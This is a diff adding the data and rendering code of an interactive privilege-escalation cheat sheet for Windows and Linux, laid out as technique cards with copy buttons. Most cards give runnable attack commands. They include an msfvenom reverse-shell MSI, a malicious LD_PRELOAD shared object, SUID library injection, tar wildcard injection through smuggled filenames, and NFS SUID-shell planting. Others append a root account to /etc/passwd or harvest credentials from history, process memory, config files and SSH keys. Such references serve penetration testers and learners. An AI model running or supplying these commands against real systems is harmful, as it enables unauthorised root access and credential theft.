+              {label:"Generate and run a malicious MSI", code:[
+                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o payload.msi",
+                "msiexec /quiet /qn /i payload.msi",
+                "# msiexec runs the installer with elevated rights because of the",
+                "# policy — the embedded payload executes as SYSTEM.",
+              ]},
+            ],
+            notes:["One of the most reliable single checks to run early — it's binary (exploitable or not) with no partial-credit conditions."],
+            tags:["msi","policy","guaranteed-system"]
+          }
+        ]
+      },
+      {
+        id: "win-schtasks",
+        name: "Scheduled Tasks",
+        cards: [
+          {
+            title: "Scheduled task binary overwrite",
+            severity: "high",
+            summary: "A scheduled task running as SYSTEM or an admin account that points to a binary you can overwrite gives you code execution at the task's next trigger.",
+            steps: [
+              {label:"Enumerate tasks and their run-as accounts", code:[
+                'schtasks /query /fo LIST /v',
+                "# Look for 'Run As User: SYSTEM' or a privileged service account",
+                "# paired with a Task To Run path you can write to.",
+              ]},
+              {label:"Check ACLs on the target binary", code:[
+                'icacls "C:\\Scripts\\backup.bat"',
+                "copy /y payload.bat \"C:\\Scripts\\backup.bat\"",
+                "# Wait for the schedule to trigger, or force it if you have rights:",
+                "schtasks /run /tn \"BackupTask\"",
+              ]},
+            ],
+            notes:[],
+            tags:["schtasks","file-write"]
+          },
+          {
+            title: "Scheduled task pointing to a missing binary",
+            severity: "high",
+            summary: "A task references a binary path that no longer exists — plant your own file at that exact path and let the scheduler execute it for you.",
+            steps: [
+              {label:"Find tasks with dangling paths", code:[
+                "schtasks /query /fo LIST /v | findstr /i \"Task To Run\"",
+                "# Manually verify each referenced path with 'dir' — a missing",
+                "# target is a free code-execution primitive if the directory",
+                "# itself is writable.",
+              ]},
+              {label:"Plant and wait / trigger", code:[
+                "copy payload.exe \"C:\\Missing\\Path\\task.exe\"",
+                'schtasks /run /tn "TaskName"',
+              ]},
+            ],
+            notes:[],
+            tags:["schtasks","missing-binary"]
+          }
+        ]
+      },
+      {
+        id: "win-hotpotato",
+        name: "Hot Potato",
+        cards: [
+          {
+            title: "Hot Potato / Potato family (NTLM relay to SYSTEM)",
+            severity: "crit",
+            summary: "Spoof local NBNS name resolution and a Windows Update proxy request to coerce an NTLM authentication from SYSTEM, then relay it locally to gain a SYSTEM token.",
+            steps: [
+              {label:"Understand the chain", code:[
+                "# 1. Spoof NBNS responses so WPAD resolution for the local Windows",
+                "#    Update service points to an attacker-controlled proxy.",
+                "# 2. Stand up a fake WPAD/HTTP server that triggers NTLM auth from",
+                "#    the SYSTEM-run service.",
+                "# 3. Relay that captured NTLM auth to a local privileged service",
+                "#    (e.g. via SMB) to execute a command as SYSTEM.",
+              ]},
+              {label:"Run the automated tool", code:[
+                "Potato.exe -ip <local_ip> -cmd \"cmd /c whoami\" -enable_httpserver true -enable_spoof true",
+                "# Modern variants (RottenPotato, JuicyPotato, PrintSpoofer,",
+                "# RoguePotato, EfsPotato) trade the NBNS-spoof approach for",
+                "# COM/RPC or named-pipe coercion depending on patch level — pick",
+                "# the variant that matches the target's OS build.",
+              ]},
+            ],
+            notes:["This entire family relies on SeImpersonatePrivilege being available on the current token — check that first (see Named Pipe Impersonation above) before choosing a specific variant."],
+            tags:["ntlm-relay","seimpersonate","potato-family"]
+          }
+        ]
+      },
+      {
+        id: "win-startup",
+        name: "Startup Applications",
+        cards: [
+          {
+            title: "Startup folder abuse",
+            severity: "med",
+            summary: "Anything dropped in the all-users Startup folder runs automatically for whichever user next logs on interactively — including admins.",
+            steps: [
+              {label:"Check writability of the shared startup folder", code:[
+                'icacls "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"',
+                "# If BUILTIN\\Users has write access here, any low-priv account can",
+                "# plant persistence that fires for the next admin logon.",
+              ]},
+              {label:"Drop a payload / shortcut", code:[
+                'copy payload.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\update.exe"',
+                "# Prefer a shortcut (.lnk) pointing to a staged payload over a",
+                "# raw .exe if you want to control window visibility/arguments.",
+              ]},
+            ],
+            notes:["This is a wait-for-admin-logon technique, not instant escalation — pair it with a way to detect or trigger that logon (e.g. RDP session monitoring) when the engagement allows it."],
+            tags:["startup-folder","persistence","wait-for-admin"]
+          }
+        ]
+      }
+    ]
+  },
+
+  linux: {
+    label: "Linux",
+    dot: "lin",
+    intro: "Linux privesc centers on SUID/SGID misuse, sudo misconfiguration, cron and PATH abuse, weak file permissions, and credentials left in history/config files. Kernel exploits are a last resort given their instability risk.",
+    categories: [
+      {
+        id: "lin-baseline",
+        name: "Baseline Enumeration",
+        cards: [
+          {
+            title: "System &amp; identity baseline",
+            severity: "info",
+            summary: "Establish kernel version, distro, current privileges, and group memberships before diving into individual technique classes.",
+            steps: [
+              {label:"Kernel and distro fingerprint", code:[
+                "uname -a; cat /etc/os-release",
+                "# Kernel version narrows the field for kernel-exploit candidates;",
+                "# distro/version matters for package-manager-based privesc too.",
+              ]},
+              {label:"Current identity", code:[
+                "id; groups; sudo -l",
+                "# 'sudo -l' with no password prompt reveals what you can already",
+                "# run as root or another user without additional credentials —",
+                "# check this immediately, it's often the fastest path.",
+              ]},
+              {label:"Automated triage tools", code:[
+                "./linpeas.sh                 # broad colour-coded enumeration",
+                "./LinEnum.sh -t               # thorough mode, SUID/cron/creds focus",
+                "pspy64                        # unprivileged process monitor — catches",
+                "                               # cron jobs and scheduled tasks live,",
+                "                               # without needing to read crontab files.",
+              ]},
+            ],
+            notes:["pspy is particularly valuable because it doesn't require read access to /etc/crontab or /var/spool/cron — it watches process creation directly via procfs polling."],
+            tags:["recon","sudo -l","triage"]
+          }
+        ]
+      },
+      {
+        id: "lin-daemons",
+        name: "Daemons",
+        cards: [
+          {
+            title: "Privileged daemons and listening services",
+            severity: "med",
+            summary: "Locally-bound services running as root (databases, management agents, custom app servers) sometimes expose an unauthenticated or weakly-authenticated control interface.",
+            steps: [
+              {label:"Enumerate root-owned processes and listeners", code:[
+                "ps aux | grep root",
+                "ss -tulpn",
+                "# Cross-reference root-owned processes against locally-bound ports;",
+                "# a database or admin API bound to 127.0.0.1 run as root is a",
+                "# common target for local exploitation or config abuse.",
+              ]},
+              {label:"Check daemon config for weak auth / exec features", code:[
+                "# e.g. Redis without requirepass, or a webapp admin panel with a",
+                "# built-in 'run script' feature reachable only from localhost —",
+                "# both can be abused to write files or execute code as the",
+                "# daemon's (often root) user.",
+              ]},
+            ],
+            notes:[],
+            tags:["daemons","local-services"]
+          }
+        ]
+      },
+      {
+        id: "lin-kernel",
+        name: "Kernel",
+        cards: [
+          {
+            title: "Kernel exploits",
+            severity: "crit",
+            summary: "Unpatched kernel vulnerabilities (e.g. Dirty Pipe, Dirty COW, overlayfs/OverlayFS namespace bugs, PwnKit for polkit) frequently grant a direct root shell.",
+            steps: [
+              {label:"Fingerprint and search", code:[
+                "uname -a",
+                "# Feed the exact kernel version into linux-exploit-suggester.sh or",
+                "# manually cross-reference against CVE trackers for that build.",
+                "./linux-exploit-suggester.sh",
+              ]},
+              {label:"Compile and run cautiously", code:[
+                "gcc exploit.c -o exploit && ./exploit",
+                "# Compile on a matching architecture/libc where possible; test in",
+                "# a disposable VM first — kernel exploits can panic or corrupt state.",
+              ]},
+            ],
+            notes:["Treat kernel exploitation as a last resort in production engagements: it's the technique most likely to crash the host. Prefer a userland misconfiguration path whenever one exists."],
+            tags:["kernel","cve","dirty-pipe","pwnkit"]
+          }
+        ]
+      },
+      {
+        id: "lin-passmine",
+        name: "Password Mining",
+        cards: [
+          {
+            title: "Logs and application data",
+            severity: "med",
+            summary: "Application and auth logs occasionally leak credentials from failed login attempts typed into the username field, or from verbose debug logging.",
+            steps: [
+              {label:"Grep common log locations", code:[
+                'grep -ri "password" /var/log/ 2>/dev/null',
+                "# Auth logs sometimes contain a password mistakenly typed as the",
+                "# username during a failed SSH/FTP login attempt.",
+              ]},
+            ],
+            notes:[],
+            tags:["logs","grep"]
+          },
+          {
+            title: "Process memory credential harvesting",
+            severity: "high",
+            summary: "Running processes can hold plaintext credentials in memory — command-line arguments, environment variables, or heap contents.",
+            steps: [
+              {label:"Command-line arguments (visible to all users by default)", code:[
+                "ps auxww | grep -i pass",
+                "# ps shows the full command line of every process on the system;",
+                "# tools that accept -p/--password on the CLI leak it to any user.",
+              ]},
+              {label:"Environment of a running process (needs read access)", code:[
+                "cat /proc/<pid>/environ | tr '\\0' '\\n'",
+                "# /proc/<pid>/environ is readable if you own the process or are",
+                "# root; occasionally group-readable due to misconfiguration.",
+              ]},
+            ],
+            notes:[],
+            tags:["proc","environment-variables"]
+          },
+          {
+            title: "Shell history",
+            severity: "high",
+            summary: "Command history files are a goldmine — users frequently type passwords, API keys, or su/sudo credentials directly on the command line.",
+            steps: [
+              {label:"Search history files across home directories", code:[
+                "cat ~/.bash_history ~/.zsh_history ~/.mysql_history 2>/dev/null",
+                "find / -name '*.*history' 2>/dev/null",
+                "# Look specifically for 'mysql -u root -p<pass>', 'su -',",
+                "# 'sshpass -p', or curl/wget calls with embedded credentials.",
+              ]},
+            ],
+            notes:[],
+            tags:["bash-history","credentials"]
+          },
+          {
+            title: "Configuration files with embedded credentials",
+            severity: "high",
+            summary: "Application and infra config commonly stores database, API, or service-account credentials in plaintext.",
+            steps: [
+              {label:"Broad config sweep", code:[
+                'grep -riE "(password|passwd|pwd|secret|api_key)\\s*=" /etc /var/www /opt 2>/dev/null',
+                "# Common hits: wp-config.php, .env files, database.yml,",
+                "# /etc/mysql/debian.cnf, /etc/shadow backups left in web roots.",
+              ]},
+              {label:"SSH private keys with weak permissions", code:[
+                "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null",
+                "# Followed by a permissions check — a world-readable private key",
+                "# for another (possibly privileged) user is immediately usable.",
+              ]},
+            ],
+            notes:[],
+            tags:["config-files","dotenv","ssh-keys"]
+          }
+        ]
+      },
+      {
+        id: "lin-sudo",
+        name: "Sudo",
+        cards: [
+          {
+            title: "Shell escape sequences (GTFOBins)",
+            severity: "crit",
+            summary: "Many binaries permitted via sudo have a documented built-in way to drop into a shell — if sudo allows you to run them, you effectively have root.",
+            steps: [
+              {label:"List what you're allowed to run", code:[
+                "sudo -l",
+                "# Cross-reference every listed binary against GTFOBins' 'sudo'",
+                "# function for that binary — most common interpreters and editors",
+                "# have a documented escape.",
+              ]},
+              {label:"Example: vim escape", code:[
+                "sudo vim -c ':!/bin/sh'",
+                "# vim's :! runs a shell command; combined with sudo, that shell",
+                "# inherits root privileges.",
+              ]},
+              {label:"Example: find escape", code:[
+                "sudo find . -exec /bin/sh \\; -quit",
+                "# find's -exec runs an arbitrary command as the invoking (here:",
+                "# root, via sudo) user for every matched file.",
+              ]},
+            ],
+            notes:["Always check GTFOBins for the exact binary and version rather than assuming — some escapes require specific flags or are patched in restricted builds."],
+            tags:["gtfobins","sudo -l","shell-escape"]
+          },
+          {
+            title: "Abusing intended functionality",
+            severity: "high",
+            summary: "Even without a documented shell escape, a sudo-permitted binary's normal functionality (file read/write, script execution) can be repurposed.",
+            steps: [
+              {label:"Arbitrary file read via a permitted binary", code:[
+                "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+                "# Abuses tar's checkpoint-action hook to execute an arbitrary",
+                "# command mid-archive, as root.",
+              ]},
+              {label:"Arbitrary script execution if a wrapper script is sudo-permitted", code:[
+                "sudo /opt/company/backup.sh",
+                "# If backup.sh is user-writable, edit it to add your own command",
+                "# before running it via sudo — it executes as root regardless of",
+                "# who wrote its current contents.",
+              ]},
+            ],
+            notes:[],
+            tags:["gtfobins","functionality-abuse"]
+          },
+          {
+            title: "LD_PRELOAD / LD_LIBRARY_PATH abuse",
+            severity: "crit",
+            summary: "If sudo's env_keep preserves LD_PRELOAD or LD_LIBRARY_PATH, you can force a sudo-permitted binary to load an arbitrary shared library as root at startup.",
+            steps: [
+              {label:"Check whether the env var is preserved", code:[
+                "sudo -l",
+                "# Look for 'env_keep+=LD_PRELOAD' (or LD_LIBRARY_PATH) in the",
+                "# Defaults line, or a target binary listed with the NOPASSWD tag",
+                "# alongside preserved environment variables.",
+              ]},
+              {label:"Build a malicious shared object", code:[
+                "cat <<EOF > shell.c",
+                "#include <stdio.h>",
+                "#include <sys/types.h>",
+                "#include <stdlib.h>",
+                "void _init() {",
+                "    unsetenv(\"LD_PRELOAD\");",
+                "    setresuid(0,0,0);",
+                "    system(\"/bin/bash -p\");",
+                "}",
+                "EOF",
+                "gcc -fPIC -shared -o shell.so shell.c -nostartfiles",
+                "# _init() runs automatically when the shared object is loaded,",
+                "# before the target binary's own main() — giving you root before",
+                "# the program's intended logic even begins.",
+              ]},
+              {label:"Trigger via the permitted sudo command", code:[
+                "sudo LD_PRELOAD=/tmp/shell.so <permitted_binary>",
+              ]},
+            ],
+            notes:["LD_LIBRARY_PATH abuse follows the same idea but targets a specific missing/hijackable library the binary dynamically links against, rather than the generic preload hook."],
+            tags:["ld_preload","env_keep","shared-object"]
+          }
+        ]
+      },
+      {
+        id: "lin-nfs",
+        name: "NFS",
+        cards: [
+          {
+            title: "no_root_squash misconfiguration",
+            severity: "crit",
+            summary: "An NFS export with no_root_squash trusts the client's root user as root on the server — mount it from a box where you control root and plant a SUID binary.",
+            steps: [
+              {label:"Identify exports lacking root-squashing", code:[
+                "showmount -e <target>",
+                "cat /etc/exports   # if you have read access to compare on a similar host",
+                "# no_root_squash (or no explicit root_squash) means the export",
+                "# does not remap the connecting client's UID 0 to 'nobody'.",
+              ]},
+              {label:"Mount from an attacker-controlled machine and plant a SUID binary", code:[
+                "mkdir /tmp/nfs && mount -o rw <target>:/export /tmp/nfs",
+                "cp /bin/bash /tmp/nfs/rootbash",
+                "chmod +xs /tmp/nfs/rootbash",
+                "# chmod is run as root on the attacker's own machine but applies",
+                "# to a file that lives on the (trusting) NFS export.",
+              ]},
+              {label:"Execute the SUID shell from the target host", code:[
+                "/export/rootbash -p",
+                "# -p on bash preserves the elevated effective UID rather than",
+                "# dropping it, since bash normally drops privileges on startup",
+                "# when euid != uid.",
+              ]},
+            ],
+            notes:["Requires you to control a separate machine (or have local root on a second box) that can mount the same export — this is why it's often chained after gaining root on one host in a segment."],
+            tags:["nfs","no_root_squash","suid-plant"]
+          }
+        ]
+      },
+      {
+        id: "lin-cron",
+        name: "Cron",
+        cards: [
+          {
+            title: "PATH abuse in cron jobs",
+            severity: "high",
+            summary: "A cron job that calls a binary by relative name, combined with a writable directory earlier in cron's PATH, lets you substitute your own binary.",
+            steps: [
+              {label:"Enumerate cron jobs and PATH", code:[
+                "cat /etc/crontab; ls /etc/cron.*; crontab -l",
+                "# Also check the PATH= line at the top of /etc/crontab — cron",
+                "# often uses a different, more permissive PATH than an interactive shell.",
+              ]},
+              {label:"Check writability of PATH directories, then hijack", code:[
+                "ls -ld /usr/local/sbin",
+                "echo -e '#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /usr/local/sbin/run-parts",
+                "chmod +x /usr/local/sbin/run-parts",
+                "# If the cron job calls 'run-parts' (or any binary) without a full",
+                "# path, and your directory resolves first, your script runs instead.",
+              ]},
+            ],
+            notes:["pspy is the fastest way to confirm exactly what a cron job executes, including its resolved PATH, without needing read access to the crontab file itself."],
+            tags:["cron","path-hijack","pspy"]
+          },
+          {
+            title: "Wildcard injection (tar/rsync/chown 'wildcard' abuse)",
+            severity: "high",
+            summary: "A cron job running a command with an unquoted wildcard over a world-writable directory lets you smuggle option flags in as filenames.",
+            steps: [
+              {label:"Identify a vulnerable wildcard cron job", code:[
+                "# e.g. a root cron job running: tar -czf backup.tar.gz *",
+                "# inside a directory writable by low-privileged users.",
+              ]},
+              {label:"Plant filenames that tar interprets as flags", code:[
+                "cd /writable/cron/dir",
+                "echo '' > '--checkpoint=1'",
+                "echo '' > '--checkpoint-action=exec=sh backdoor.sh'",
+                "echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > backdoor.sh",
+                "# When cron's tar expands the wildcard, it globs these filenames",
+                "# in as arguments — tar treats leading '--' names as flags, not",
+                "# as files to archive, triggering the checkpoint-action exec.",
+              ]},
+            ],
+            notes:["The same class applies to chown/rsync/7z run against a wildcard in a writable directory — check GTFOBins' 'wildcard' entries for the exact payload syntax per tool."],
+            tags:["wildcard-injection","tar","gtfobins"]
+          },
+          {
+            title: "Cron script file overwrite",
+            severity: "high",
+            summary: "A cron entry pointing at a script you can write to directly is the simplest case — no injection tricks needed.",
+            steps: [
+              {label:"Confirm writability of the referenced script", code:[
+                "ls -l /opt/scripts/cleanup.sh",
+                "# If the file (or its containing directory, allowing delete+",
+                "# recreate) is writable by you, you own whatever runs it.",
+              ]},
+              {label:"Append a payload", code:[
+                "echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /opt/scripts/cleanup.sh",
+                "# Append rather than overwrite where stealth/OPSEC matters, so",
+                "# the job's original function still appears to run normally.",
+              ]},
+            ],
+            notes:[],
+            tags:["cron","file-permissions"]
+          }
+        ]
+      },
+      {
+        id: "lin-suid",
+        name: "SUID Binaries",
+        cards: [
+          {
+            title: "Known SUID binary abuse (GTFOBins)",
+            severity: "crit",
+            summary: "A SUID bit runs the binary with the file owner's privileges (often root) regardless of who invokes it — many common binaries have a documented privesc path when SUID.",
+            steps: [
+              {label:"Enumerate SUID/SGID binaries", code:[
+                "find / -perm -4000 -type f 2>/dev/null",
+                "find / -perm -2000 -type f 2>/dev/null",
+                "# -4000 = SUID bit, -2000 = SGID bit. Compare results against a",
+                "# clean baseline for the distro — anything non-standard is",
+                "# immediately worth investigating.",
+              ]},
+              {label:"Example: find with SUID bit", code:[
+                "find . -exec /bin/sh -p \\; -quit",
+                "# -p on the spawned shell preserves the elevated effective UID",
+                "# inherited from the SUID binary that launched it.",
+              ]},
+            ],
+            notes:["Cross-reference every non-standard hit against GTFOBins' 'SUID' function for that binary before assuming it's exploitable — behavior varies by version and compiled options."],
+            tags:["suid","gtfobins","find"]
+          },
+          {
+            title: "Shared object (library) injection",
+            severity: "high",
+            summary: "A SUID binary that dynamically links a library from a non-standard, writable path will load and execute your code at its privilege level.",
+            steps: [
+              {label:"Trace library loads for missing/writable paths", code:[
+                "ltrace ./suid_binary 2>&1 | grep -i \".so\"",
+                "strace -f -e trace=open,openat ./suid_binary 2>&1 | grep -i \"No such file\"",
+                "# Look for a .so the binary tries to open that doesn't exist yet,",
+                "# or exists in a directory you can write to.",
+              ]},
+              {label:"Build and plant the malicious shared object", code:[
+                "cat <<EOF > inject.c",
+                "#include <stdio.h>",
+                "#include <stdlib.h>",
+                "static void inject() __attribute__((constructor));",
+                "void inject() { setuid(0); setgid(0); system(\"/bin/bash -p\"); }",
+                "EOF",
+                "gcc -shared -fPIC -o /writable/path/missing.so inject.c",
+                "# __attribute__((constructor)) runs on load, before the target",
+                "# binary's own main() — same principle as the LD_PRELOAD case.",
+              ]},
+            ],
+            notes:[],
+            tags:["shared-object","ltrace","strace"]
+          },
+          {
+            title: "Symlink abuse against a SUID binary",
+            severity: "med",
+            summary: "A SUID binary operating on a file path you influence via a symlink can be tricked into reading/writing a file it shouldn't (classic TOCTOU / confused deputy).",
+            steps: [
+              {label:"Identify a SUID binary that follows a predictable/user-influenced path", code:[
+                "# e.g. a custom SUID tool that always writes a log to a fixed",
+                "# filename in a directory you can write to.",
+              ]},
+              {label:"Pre-create a symlink to the real target", code:[
+                "ln -s /etc/shadow /tmp/applog.log",
+                "# If the SUID binary opens /tmp/applog.log for writing (running",
+                "# as root) without validating it's a regular file it created",
+                "# itself, it will follow the symlink and write through it.",
+              ]},
+            ],
+            notes:["This class depends heavily on the specific binary's exact file-handling logic — confirm with strace before relying on it."],
+            tags:["symlink","toctou","confused-deputy"]
+          },
+          {
+            title: "Environment variable abuse (SUID + PATH/IFS)",
+            severity: "high",
+            summary: "A SUID binary that shells out to another program by relative name, or relies on an unsanitized IFS, inherits your controlled environment when it does so.",
+            steps: [
+              {label:"Check for relative-path system()/exec() calls", code:[
+                "strings suid_binary | grep -E '^[a-z_]+$' | head -30",
+                "# Look for bare command names (no leading /) the binary might",
+                "# shell out to internally, e.g. via system(\"ps\") instead of",
+                "# system(\"/bin/ps\").",
+              ]},
+              {label:"Hijack via PATH", code:[
+                "export PATH=/tmp:$PATH",
+                "echo '/bin/bash -p' > /tmp/ps",
+                "chmod +x /tmp/ps",
+                "./suid_binary",
+                "# When the SUID binary calls 'ps' without a full path, your /tmp",
+                "# entry resolves first and executes with the binary's privileges.",
+              ]},
+            ],
+            notes:[],
+            tags:["path-hijack","suid","strings"]
+          }
+        ]
+      },
+      {
+        id: "lin-fileperms",
+        name: "File Permissions",
+        cards: [
+          {
+            title: "Writable startup scripts (init/systemd)",
+            severity: "high",
+            summary: "Boot-time scripts run as root; a writable init.d, rc.local, or systemd unit file gives you root at the next reboot (or immediately, if you can trigger it).",
+            steps: [
+              {label:"Check writability of common startup locations", code:[
+                "ls -l /etc/init.d/ /etc/rc.local",
+                "find /etc/systemd/system -writable 2>/dev/null",
+                "# Also check ExecStart= paths inside systemd unit files for",
+                "# writable target binaries, same principle as Windows services.",
+              ]},
+              {label:"Insert a payload", code:[
+                "echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /etc/rc.local",
+                "# Triggers at next boot; if you can request/force a reboot within",
+                "# scope, this converts into a near-immediate root shell.",
+              ]},
+            ],
+            notes:[],
+            tags:["init-scripts","systemd","boot-persistence"]
+          },
+          {
+            title: "Writable configuration files owned by privileged services",
+            severity: "high",
+            summary: "Config files for root-run services (cron, sudoers, PAM modules) that are writable by a low-privileged user let you rewrite the trust boundary directly.",
+            steps: [
+              {label:"Check the obvious high-value targets first", code:[
+                "ls -l /etc/sudoers /etc/sudoers.d/ /etc/passwd /etc/shadow /etc/pam.d/",
+                "# A writable /etc/passwd is a direct root primitive: add a new",
+                "# UID-0 entry with a known password hash.",
+              ]},
+              {label:"Example: writable /etc/passwd", code:[
+                "openssl passwd -1 -salt xyz mypassword",
+                "echo 'rootuser:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd",
+                "su rootuser",
+                "# Appends a fully-privileged (UID/GID 0) account with a password",
+                "# you know, independent of the existing root account entirely.",
+              ]},
+            ],
+            notes:["Always verify write access with actual attempted writes (touch/echo), not just 'ls -l' output — ACLs, mount options (ro), and mandatory access control (SELinux/AppArmor) can all override the base permission bits shown."],
+            tags:["etc-passwd","sudoers","direct-write"]
+          }
+        ]
+      }
+    ]
+  }
+};
+
+/* ===========================================================================
+   RENDERING
+=========================================================================== */
+
+function sevLabel(s){
+  return {crit:"Critical", high:"High", med:"Medium", low:"Low", info:"Info"}[s] || s;
+}
+
+function renderCard(osKey, card, catId){
+  const stepsHtml = card.steps.map((s,i)=>`
+    <div class="step">
+      <div class="step-label"><span class="idx">${String(i+1).padStart(2,'0')}</span> ${esc(s.label)}</div>
+      ${codeBlock(s.code)}
+    </div>
+  `).join('');
+
+  const notesHtml = card.notes.length ? `
+    <div class="notes-box">${card.notes.map(n=>`<div>${n.replace(/\*\*(.*?)\*\*/g,'<b>$1</b>')}</div>`).join('')}</div>
+  ` : '';
+
+  const tagsHtml = card.tags.length ? `
+    <div class="tag-row">${card.tags.map(t=>`<span class="tag">#${esc(t)}</span>`).join('')}</div>
+  ` : '';
+
+  const searchBlob = (card.title + ' ' + card.summary + ' ' + card.tags.join(' ') + ' ' +
+    card.steps.map(s=>s.label+' '+s.code.join(' ')).join(' ')).toLowerCase();
+
+  return `
+    <article class="card" data-os="${osKey}" data-cat="${catId}" data-search="${esc(searchBlob)}">
+      <div class="card-head" onclick="this.closest('.card').classList.toggle('open')">
+        <div class="card-title-wrap">
+          <div class="card-title">${card.title}</div>
+          <div class="card-summary">${esc(card.summary)}</div>
+        </div>
+        <div class="card-meta">
+          <span class="sev ${card.severity}">${sevLabel(card.severity)}</span>
+          <svg class="chevron" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M7 4l7 6-7 6"/></svg>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="card-body-inner">
+          <div class="section-label">Procedure</div>
+          ${stepsHtml}
+          ${notesHtml}
+          ${tagsHtml}
+        </div>
+      </div>
+    </article>
+  `;
+}
+
+function renderOS(osKey){
+  const os = DATA[osKey];
+  const container = document.getElementById(osKey);
+  let cardCount = 0;
+  const catsHtml = os.categories.map(cat=>{
+    cardCount += cat.cards.length;
+    return `
+      <div class="category-block">
+        <h4 class="category-title" id="${cat.id}">${cat.name} <span style="color:var(--muted-2); font-weight:400;">(${cat.cards.length})</span></h4>
+        ${cat.cards.map(c=>renderCard(osKey, c, cat.id)).join('')}
+      </div>
+    `;
+  }).join('');
+
+  container.innerHTML = `
+    <div class="os-header">
+      <span class="dot ${os.dot}"></span>
+      <h3>${os.label}</h3>
+      <span class="os-tag">${cardCount} techniques</span>
+      <div class="os-line"></div>
+    </div>
+    <p style="color:var(--muted); font-size:13.5px; max-width:680px; margin-bottom:8px;">${os.intro}</p>
+    ${catsHtml}
+    <div class="no-results" data-os-empty="${osKey}">No techniques match your search in ${os.label}.</div>
+  `;
+  return cardCount;
+}
+
+function renderSidebarTree(){
+  const tree = document.getElementById('tree');
+  tree.innerHTML = Object.keys(DATA).map(osKey=>{
+    const os = DATA[osKey];
+    return `
+      <div class="tree-os">
+        <div class="tree-os-label" onclick="location.hash='${osKey}'">
+          <span class="dot ${os.dot}"></span>${os.label}
+        </div>
+        <div class="tree-cats">
+          ${os.categories.map(cat=>`
+            <div class="tree-cat" onclick="scrollToCat('${cat.id}')">
+              ${cat.name} <span class="n">${cat.cards.length}</span>
+            </div>
+          `).join('')}
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function scrollToCat(id){
+  const el = document.getElementById(id);
+  if(el) el.scrollIntoView({behavior:'smooth', block:'start'});
+}
+
+function renderStats(){
+  const winCount = DATA.windows.categories.reduce((a,c)=>a+c.cards.length,0);
+  const linCount = DATA.linux.categories.reduce((a,c)=>a+c.cards.length,0);
+  const critCount = [...DATA.windows.categories, ...DATA.linux.categories]
+    .flatMap(c=>c.cards).filter(c=>c.severity==='crit').length;
+  document.getElementById('statsRow').innerHTML = `
+    <div class="stat"><b>${winCount}</b><span>Windows techniques</span></div>
+    <div class="stat"><b>${linCount}</b><span>Linux techniques</span></div>
+    <div class="stat"><b>${winCount+linCount}</b><span>Total documented</span></div>
+    <div class="stat"><b>${critCount}</b><span>Critical severity</span></div>
+  `;
+}
+
+/* ===========================================================================
+   INTERACTIVITY: search, copy-to-clipboard
+=========================================================================== */
+
+function copyCode(btn){
+  const pre = btn.parentElement.querySelector('pre');
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(()=>{
+    const original = btn.textContent;
+    btn.textContent = 'copied';
+    btn.classList.add('copied');
+    setTimeout(()=>{ btn.textContent = original; btn.classList.remove('copied'); }, 1400);
+  });
+}
+
+function initSearch(){
+  const input = document.getElementById('search');
+  const countEl = document.getElementById('searchCount');
+  const allCards = () => document.querySelectorAll('.card');
+
+  input.addEventListener('input', ()=>{
+    const q = input.value.trim().toLowerCase();
+    let visible = 0;
+    allCards().forEach(card=>{
+      const match = !q || card.dataset.search.includes(q);
+      card.classList.toggle('hidden', !match);
+      if(match){
+        visible++;
+        if(q) card.classList.add('open'); else card.classList.remove('open');
+      }
+    });
+
+    // category titles: hide if all their cards are hidden
+    document.querySelectorAll('.category-block').forEach(block=>{
+      const visibleCards = block.querySelectorAll('.card:not(.hidden)').length;
+      block.style.display = (q && visibleCards === 0) ? 'none' : '';
+    });
+
+    // per-OS empty state
+    ['windows','linux'].forEach(osKey=>{
+      const container = document.getElementById(osKey);
+      const anyVisible = container.querySelectorAll('.card:not(.hidden)').length > 0;
+      const emptyEl = container.querySelector(`[data-os-empty="${osKey}"]`);
+      if(emptyEl) emptyEl.style.display = (q && !anyVisible) ? 'block' : 'none';
+    });
+
+    countEl.textContent = q ? `${visible} match${visible===1?'':'es'}` : '';
+  });
+}
+
+/* ===========================================================================
+   INIT
+=========================================================================== */
+renderStats();
+renderOS('windows');
+renderOS('linux');
+renderSidebarTree();
+initSearch();
+</script>
+</body>
+</html>
